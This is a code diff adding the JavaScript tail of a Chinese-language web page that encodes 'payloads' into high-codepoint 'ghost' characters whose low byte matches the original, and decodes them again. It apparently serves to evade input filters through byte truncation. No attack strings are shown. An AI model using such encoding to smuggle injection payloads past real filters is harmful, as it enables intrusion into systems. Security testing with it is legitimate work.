+        const cp = r.transformed.codePointAt(i);
+        if (cp > 0xFFFF) {
+          i++;
+          result += '\\u{' + cp.toString(16).toUpperCase() + '}';
+        } else if (cp > 0x7F) {
+          result += '\\u' + cp.toString(16).toUpperCase().padStart(4, '0');
+        } else {
+          result += r.transformed[i];
+        }
+      }
+      return result;
+    }
+    case 'java': {
+      let result = '"';
+      for (let i = 0; i < r.transformed.length; i++) {
+        const cp = r.transformed.codePointAt(i);
+        if (cp > 0xFFFF) {
+          i++;
+          result += '\\u' + cp.toString(16).toUpperCase().padStart(4, '0');
+        } else if (cp > 0x7F) {
+          result += '\\u' + cp.toString(16).toUpperCase().padStart(4, '0');
+        } else if (cp === 0x22) {
+          result += '\\"';
+        } else if (cp === 0x5C) {
+          result += '\\\\';
+        } else if (cp === 0x0A) {
+          result += '\\n';
+        } else if (cp === 0x0D) {
+          result += '\\r';
+        } else if (cp === 0x09) {
+          result += '\\t';
+        } else {
+          result += r.transformed[i];
+        }
+      }
+      result += '"';
+      return result;
+    }
+    case 'bytes': {
+      const encoder = new TextEncoder();
+      const bytes = encoder.encode(r.transformed);
+      const parts = [];
+      for (let i = 0; i < bytes.length; i++) {
+        parts.push('0x' + bytes[i].toString(16).toUpperCase().padStart(2, '0'));
+      }
+      return parts.join(' ');
+    }
+    default:
+      return r.transformed;
+  }
+}
+
+function renderOutputBox(format) {
+  const output = formatOutput(format);
+  document.getElementById('outputBox').textContent = output;
+}
+
+function renderCompareBox() {
+  const r = currentTransformResult;
+  let html = '';
+  for (const m of r.mappings) {
+    if (m.changed) {
+      const origDisplay = m.original === ' ' ? '␣' :
+                          m.original === '\n' ? '↵' :
+                          m.original === '\r' ? '⏎' :
+                          m.original === '\t' ? '⇥' :
+                          escapeHtml(m.original);
+      const ghostDisplay = m.ghostChar === ' ' ? '␣' :
+                           m.ghostChar === '\n' ? '↵' :
+                           m.ghostChar === '\r' ? '⏎' :
+                           m.ghostChar === '\t' ? '⇥' :
+                           escapeHtml(m.ghostChar);
+      html += `<span style="color:var(--success);background:rgba(16,185,129,0.12);padding:1px 3px;border-radius:3px;" title="${m.originalHex}">${origDisplay}</span>`;
+      html += `<span style="color:var(--text-muted);margin:0 2px;">→</span>`;
+      html += `<span style="color:var(--ghost);background:rgba(139,92,246,0.12);padding:1px 3px;border-radius:3px;" title="${m.ghostHex}">${ghostDisplay}</span>`;
+      html += ' ';
+    } else {
+      const display = m.original === ' ' ? '␣' :
+                      m.original === '\n' ? '↵\n' :
+                      m.original === '\r' ? '⏎' :
+                      m.original === '\t' ? '⇥' :
+                      escapeHtml(m.original);
+      html += `<span style="color:var(--text-muted);opacity:0.5;">${display}</span>`;
+    }
+  }
+  document.getElementById('compareBox').innerHTML = html;
+}
+
+function renderMappingTable(filter = '') {
+  const r = currentTransformResult;
+  const seen = new Map();
+
+  let html = '';
+  for (const m of r.mappings) {
+    if (seen.has(m.originalCode) && !m.changed) continue;
+    if (seen.has(m.originalCode) && seen.get(m.originalCode).ghostCodePoint === m.ghostCodePoint) continue;
+
+    const filterLower = filter.toLowerCase();
+    const searchable = `${m.original} ${m.originalHex} ${m.ghostChar} ${m.ghostHex} ${m.originalCode}`.toLowerCase();
+    if (filter && !searchable.includes(filterLower)) continue;
+
+    seen.set(m.originalCode, m);
+
+    const rowClass = m.changed ? 'changed-row' : 'unchanged-row';
+    const origDisplay = m.original === ' ' ? '␣' :
+                        m.original === '\n' ? '↵' :
+                        m.original === '\r' ? '⏎' :
+                        m.original === '\t' ? '⇥' :
+                        escapeHtml(m.original);
+    const ghostDisplay = m.ghostChar === ' ' ? '␣' :
+                         m.ghostChar === '\n' ? '↵' :
+                         m.ghostChar === '\r' ? '⏎' :
+                         m.ghostChar === '\t' ? '⇥' :
+                         escapeHtml(m.ghostChar);
+
+    html += `<tr class="${rowClass}">
+      <td class="char-cell orig-char">${origDisplay}</td>
+      <td class="hex-cell">${m.originalCode} / ${m.originalHex}</td>
+      <td class="arrow">→</td>
+      <td class="char-cell ghost-char">${ghostDisplay}</td>
+      <td class="hex-cell">${m.ghostHex}<br><span style="font-size:11px;color:var(--text-muted)">${m.ghostBinary.substring(0,8)}<span style="color:var(--danger)">|</span><span style="color:var(--success)">${m.ghostBinary.substring(8)}</span></span></td>
+      <td>${m.changed ? '<span class="badge badge-ghost">已变形</span>' : '<span style="color:var(--text-muted);font-size:12px;">未变形</span>'}</td>
+    </tr>`;
+  }
+  document.getElementById('mappingBody').innerHTML = html || '<tr><td colspan="6" style="text-align:center;color:var(--text-muted);padding:20px;">无匹配结果</td></tr>';
+}
+
+// ========== UI Helpers ==========
+
+function switchOutputFormat(format, tabEl) {
+  currentOutputFormat = format;
+  document.querySelectorAll('#outputTabs .format-tab').forEach(t => t.classList.remove('active'));
+  tabEl.classList.add('active');
+  if (currentTransformResult) renderOutputBox(format);
+}
+
+function filterMapping() {
+  const q = document.getElementById('mappingSearch').value;
+  renderMappingTable(q);
+}
+
+function setPreset(key) {
+  document.getElementById('inputPayload').value = PRESETS[key] || '';
+}
+
+function onModeChange() {
+  const mode = document.getElementById('mode').value;
+  document.getElementById('customCharGroup').style.display = mode === 'custom' ? '' : 'none';
+}
+
+function copyOutput() {
+  const text = document.getElementById('outputBox').textContent;
+  navigator.clipboard.writeText(text).then(() => {
+    showToast('已复制到剪贴板');
+  }).catch(() => {
+    const ta = document.createElement('textarea');
+    ta.value = text;
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+    showToast('已复制到剪贴板');
+  });
+}
+
+function decode() {
+  const input = document.getElementById('inputPayload').value;
+  if (!input.trim()) { showToast('请先输入要解码的 Payload'); return; }
+
+  let decoded = '';
+  const mappings = [];
+  let changedCount = 0;
+
+  for (let i = 0; i < input.length; i++) {
+    const cp = input.codePointAt(i);
+    const lowByte = cp & 0xFF;
+    const originalChar = String.fromCharCode(lowByte);
+    const isGhost = cp > 0xFF;
+
+    decoded += originalChar;
+    mappings.push({
+      original: input[i],
+      originalCode: cp,
+      originalHex: 'U+' + cp.toString(16).toUpperCase().padStart(4, '0'),
+      ghostChar: originalChar,
+      ghostCodePoint: lowByte,
+      ghostHex: '0x' + lowByte.toString(16).toUpperCase().padStart(2, '0'),
+      ghostBinary: cp.toString(2).padStart(16, '0'),
+      changed: isGhost
+    });
+
+    if (isGhost) changedCount++;
+    if (cp > 0xFFFF) i++;
+  }
+
+  document.getElementById('decodeResultSection').style.display = 'block';
+  document.getElementById('decodeResultBox').textContent = decoded;
+
+  currentTransformResult = {
+    original: input,
+    transformed: decoded,
+    mappings,
+    changedCount,
+    totalChars: mappings.length,
+    mode: 'decode',
+    highByteBase: 'decode'
+  };
+  currentOutputFormat = 'raw';
+
+  renderOutput();
+}
+
+function copyDecodeResult() {
+  const text = document.getElementById('decodeResultBox').textContent;
+  navigator.clipboard.writeText(text).then(() => {
+    showToast('已复制解码结果到剪贴板');
+  }).catch(() => {
+    const ta = document.createElement('textarea');
+    ta.value = text;
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+    showToast('已复制解码结果到剪贴板');
+  });
+}
+
+function clearAll() {
+  document.getElementById('inputPayload').value = '';
+  document.getElementById('outputSection').style.display = 'none';
+  document.getElementById('decodeResultSection').style.display = 'none';
+  currentTransformResult = null;
+}
+
+function showToast(msg) {
+  const el = document.getElementById('toast');
+  el.textContent = msg;
+  el.classList.add('show');
+  clearTimeout(el._timer);
+  el._timer = setTimeout(() => el.classList.remove('show'), 2000);
+}
+
+function escapeHtml(str) {
+  const div = document.createElement('div');
+  div.textContent = str;
+  return div.innerHTML;
+}
+</script>
+</body>
+</html>
